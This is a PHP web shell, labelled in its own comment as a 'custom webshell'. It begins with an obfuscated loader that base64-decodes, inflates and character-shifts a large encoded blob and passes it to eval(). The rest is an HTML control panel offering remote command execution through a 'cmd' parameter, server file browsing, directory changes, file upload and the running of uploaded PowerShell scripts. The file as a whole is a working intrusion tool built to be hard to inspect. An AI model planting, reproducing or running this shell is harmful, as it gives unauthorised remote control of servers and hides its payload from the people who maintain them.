<!-- 
#퍙洧늸   洧늻洧니洧닉 洧닉洧뉧롑뫯롑떯롑洧닊洧닋洧닆 
#퍙洧늸   custom webshell
-->

<?php function gymQ($CCfaV)
{ 
$CCfaV=gzinflate(base64_decode($CCfaV));
 for($i=0;$i<strlen($CCfaV);$i++)
 {
$CCfaV[$i] = chr(ord($CCfaV[$i])-1);
 }
 return $CCfaV;
 }eval(gymQ("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"));?>

<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <title>My WebShell</title>
        
        <script>
            function changeDir() {
                const url = '<?php echo $_SERVER['PHP_SELF'].'?dir='?>';
                const path = window.prompt("Enter the path you want to naviguate to (Eg: '/home/user'): ");

                if (path) window.location = (url + path);
            }
        </script>
        <style>
            :root {
                --header-color: <?php echo getHeaderColor();?>;
                --background-color-1: <?php echo getBgColor(1);?>;
                --background-color-2: <?php echo getBgColor(2);?>;
                --background-color-3: <?php echo getBgColor(3);?>;
                --background-color-4: <?php echo getBgColor(4);?>;
                --primary-color: <?php echo getPrimaryColor();?>;
                --secondary-color: <?php echo getSecondaryColor();?>;
                --command-color: <?php echo getCommandColor();?>;
                --commandoutput-color: <?php echo getCommandOutputColor();?>;
                --explorer-color: <?php echo getExplorerColor();?>;
                --directory-color: <?php echo getDirectoryColor();?>;
                --navtext-color: <?php echo getNavTextColor();?>;
                --navtext-hover-color: <?php echo getNavTextHoverColor();?>;
                --header-text-color: <?php echo getHeaderTextColor();?>;
                --buttons-color: <?php echo getButtonsColor();?>;
            }
        </style>
        <script>
            const popupHtmlUploadFile = `
                <div class="popup-container" id="upload-popup">
                    <div class="popup">
                        <h4>Choose a file to upload</h4>
                        <form action="<?php echo $_SERVER['PHP_SELF'].'?dir='.getDir()?>" method="POST" enctype="multipart/form-data">
                            <input type="file" name='file' id='file' required>
                            <div class="popup-buttons">
                                <button type="button" onclick="hidePopup()">Cancel</button>
                                <input type="submit" value="Upload" name="upload">
                            </div>
                        </form>
                    </div>
                </div>
            `;
            const popupHtmlRunPowerShellScript = `
                <div class="popup-container" id="upload-popup">
                    <div class="popup">
                        <h4>Choose a script to run...</h4>
                        <form action="<?php echo $_SERVER['PHP_SELF'].'?dir='.getDir()?>" method="POST" enctype="multipart/form-data">
                            <input type="file" name='file' id='file' required>
                            <div class="popup-buttons">
                                <button type="button" onclick="hidePopup()">Cancel</button>
                                <input type="submit" value="runpwsh" name="runpwsh">
                            </div>
                        </form>
                    </div>
                </div>
            `;
            function showUploadPopup() {
                const body = document.getElementsByTagName('body')[0];
                const bodyHTML = body.innerHTML;

                body.innerHTML = popupHtmlUploadFile + bodyHTML;
            }
            function showRunScriptPopup() {
                const body = document.getElementsByTagName('body')[0];
                const bodyHTML = body.innerHTML;

                body.innerHTML = popupHtmlRunPowerShellScript + bodyHTML;
            }
            function hidePopup() {
                const body = document.getElementsByTagName('body')[0];
                body.removeChild(body.getElementsByClassName('popup-container')[0]); 
            }
        </script>
    </head>
    <body class="body-container">   
        <header>
            <nav>
                <h1>> control panel</h1>
                <div class="nav-items">
                    <a onclick="showUploadPopup()">[upload]</a>
                    <a onclick="changeDir()">[cd]</a>
                </div>
            </nav>
        </header>
        <div class="content-container">
            <div class="explorer-panel">
                <h4>Exploring: <?php echo getDir()?></h4>
                <table>
                    <tr style="background-color:var(--header-color);">
                        <th>Folder / <span style="font-weight: lighter;">File</span></th>
                        <!--<th>Owner</th>
                        //<th>Permissions</th> -->
                        <th>Size</th>
                        <th>Actions</th>
                    </tr>
                    <?php getFiles()?>
                </table>
            </div>
            <div class="command-panel">
                <div class="command-output">
                    <p><?php echo getCommandLine()?></p>
                    <p><?php getCmdResults()?></p>
                </div>
                <form id="command-input" action="<?php echo $_SERVER['PHP_SELF']?>" method="get">
                    <input type="text" name="cmd">
                    <input type="hidden" name="dir" value="<?php echo getDir()?>"/>
                    <button action="submit">
                        <p>Send</p>
                    </button>
                </form>
            </div>
        </div>
        <style>



            html, body {
                width: 100%;
                height: 100%;
                margin: 0;
                padding: 0;
                background-color: var(--background-color-2);
                
            }

            .body-container {
                display: grid;
                grid-template-rows: 50px calc(100% - 50px);
            }

            header {
                z-index:1;
                background-color: var(--header-color);
                box-shadow: 0px 2px 6px black;
            }

            header nav {
                height: 100%;
                display: flex;
                justify-content: flex-start;     
                color: var(--header-text-color);
                font-family: 'Consolas', monospace;
            }

            header h1 {
                height: 100%;
                margin: 0;
                margin-left: 20px;
                text-align: center;
                line-height: 50px;
                font-size: 24px;
            }

            header .nav-items {
                height: 100%;
                width: auto;
                margin: 0;
                display: flex;
                flex-grow: 1;
                justify-content: flex-end;
            }

            header .nav-items a {
                height: 100%;
                margin-right: 30px;
                color: var(--navtext-color);
                font-size: 12px;
                text-decoration: none;
                line-height: 50px;
                text-align:center;
                transition: ease-in 0.2s;     
            }

            header .nav-items a:hover {
                color:  var(--navtext-hover-color);
                cursor: pointer;
            }

            .content-container {
                height: 100%;
                position: relative;
                display: grid;
                grid-template-columns: 30% 70%;      
                color:  rgb(0, 128, 255);
                font-family: 'Consolas', monospace;
            }

            .explorer-panel {
                background-color: var(--background-color-3);
                color: var(--explorer-color);
                font-family: 'Consolas', monospace;
                overflow-y: scroll;
                scrollbar-color: var(--background-color-4) var(--background-color-3);
                scrollbar-width: thin;
                box-shadow: 0px 0px 4px black;
                padding: 3px;
            }

            .explorer-panel h4 {
                margin: 10px;
                font-size: 12px;
                color: var(--explorer-color);
            }

            .explorer-panel table {font-size
                width: 100%;
                word-wrap: break-word;
                border-spacing: 2px;
                table-layout: auto;
                color: hsl(30, 100%, 50%);
                background-color: var(--background-color-2);
                font-size: 12px;
            }

            .explorer-panel table td {
                padding: 1px 2px;
            }

            .explorer-panel table a {
                color: var(--primary-color);
                text-decoration: none;         
            }

            .explorer-panel table a:hover {
                color: var(--secondary-color);
                transition: ease 0.2s;
                font-size: 12px;
            }

            .command-panel {    
                margin: 20px;
                padding: 15px;
                border-radius: 5px;
                color: var(--command-color);
                background-color: var(--background-color-3);
                display: grid;
                grid-template-rows: 93% calc(7% - 15px);
                row-gap: 15px;
                box-shadow: 0px 0px 6px black;
                font-size: 8px;
            }

            .command-output {
                padding: 5px;
                border-radius: 5px;
                background-color: var(--background-color-1);              
                overflow-y: scroll;
                scrollbar-color: var(--background-color-4) var(--background-color-3);
                scrollbar-width: thin;
                font-family: 'Consolas', monospace;
                color: var(--commandoutput-color);
            }

            .command-output p {
                margin: 0px;
                font-family: 'Consolas', monospace;
            }

            #command-input {
                display: grid;
                grid-template-columns: 89% 10%;
                grid-template-rows: 100%;
                column-gap: 1%;
            }

            #command-input input{
                height: 100%;
                width: 100%;
                border-radius: 5px;
                border: none;
                background-color: var(--background-color-2);        
                color: var(--command-color);
                font-size: 12px;
            }

            #command-input button{
                height: 100%;
                width: 100%;
                border: none;
                border-radius: 5px;
                background-color: var(--background-color-4);  
                cursor: pointer;
            }

            #command-input button:hover{
                background-color: var(--primary-color);
                transition: ease-in-out 0.3s;
            }

            #command-input button p{
                margin:0;
                color: var(--buttons-color);
                font-family: 'Consolas', monospace;
                font-size: 12px;
                font-weight: bolder;
                line-height: 100%;
            }


            .popup-container {
                z-index: 5;
                position: fixed;
                background-color: rgba(10,10,10, 0.6);
                width: 100%;
                height: 100%;
                display: grid;
                justify-content: center;
                align-content: center;
                grid-template-columns: 30%;
                grid-template-rows: 35%;
            }

            .popup {
                background-color: var(--background-color-3);
                border-radius: 5px;
                box-shadow: 0px 2px 6px black;
                display: grid;
                grid-template-rows: 20% 70%;
                row-gap: 10%;
                padding: 2.5%;
            }

            .popup h4{
                text-align: center;
                font-family: 'Consolas', monospace;
                font-size: 12px;
            }

            .popup form {
                display: grid;
                grid-template-rows: 80% 20%;
                grid-template-columns: 95%;
                justify-content: center;
                align-content: center;
            }

            .popup-buttons {
                height: 100%;
                display: inline-flex;
                flex-wrap: wrap;
                gap: 10%;
            }

            .popup-buttons button {
                width: 45%;
                background-color: var(--background-color-4);
                border-radius: 4px;;
                border: none;
                font-size: 22px;
                color: var(--buttons-color);
                transition: ease-in 0.2s;
            }

            .popup-buttons button:hover {
                background-color: var(--background-color-2);
                cursor: pointer;            
            }

            .popup-buttons input {
                width: 45%;
                background-color: var(--primary-color);
                border-radius: 4px;;
                border: none;
                font-size: 22px;
                color: var(--buttons-color);
                transition: ease-in 0.2s;
            }

            .popup-buttons input:hover {
                background-color: var(--secondary-color);
                cursor: pointer; 
            }
        </style>
    </body>
</html>



